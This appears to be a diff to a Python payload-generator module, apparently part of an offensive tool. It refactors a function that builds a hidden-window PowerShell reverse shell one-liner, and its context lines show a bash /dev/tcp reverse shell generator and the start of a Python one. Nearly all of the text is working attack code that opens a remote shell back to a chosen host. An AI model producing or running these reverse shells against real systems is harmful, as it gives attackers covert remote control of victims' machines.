@@ -21,9 +21,9 @@ def bash_reverse_shell(lhost: str, lport: int) -> str:
     return f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
 
 def powershell_reverse_shell(lhost: str, lport: int) -> str:
-    """Return an encoded PowerShell reverse shell one-liner."""
+    """Return a PowerShell reverse shell one-liner."""
     parts = [
-        "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});",
+        f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});",
         "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};",
         "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){",
         "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);",
@@ -33,9 +33,8 @@ def powershell_reverse_shell(lhost: str, lport: int) -> str:
         "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};",
         "$client.Close()",
     ]
-    return 'powershell -nop -w hidden -c "{}"'.format(
-        " ".join(parts).format(host=lhost, port=lport)
-    )
+    script = " ".join(parts)
+    return f'powershell -nop -w hidden -c "{script}"'
 
 def python_reverse_shell(lhost: str, lport: int, *, python: str = "python3") -> str:
     """Return a Python reverse shell one-liner."""
